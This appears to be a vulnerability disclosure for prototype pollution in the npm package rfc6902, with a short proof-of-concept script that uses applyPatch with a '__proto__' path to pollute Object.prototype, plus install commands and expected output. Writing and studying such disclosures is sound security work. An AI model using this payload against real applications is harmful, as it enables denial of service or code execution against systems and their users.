# Description

`rfc6902` is vulnerable to `Prototype Pollution`.
This package allowing for modification of prototype behavior, which may result in Information Disclosure/DoS/RCE.


# Proof of Concept

1. Create the following PoC file:

```js
// poc.js
var rfc6902 = require("rfc6902")
var obj = {}
console.log("Before : " + {}.polluted);
rfc6902.applyPatch(obj, [{ op: 'add', path: "/__proto__/polluted", value: "Yes! Its Polluted"}]);
console.log("After : " + {}.polluted);
```

2. Execute the following commands in another terminal:

```bash
npm i rfc6902 # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
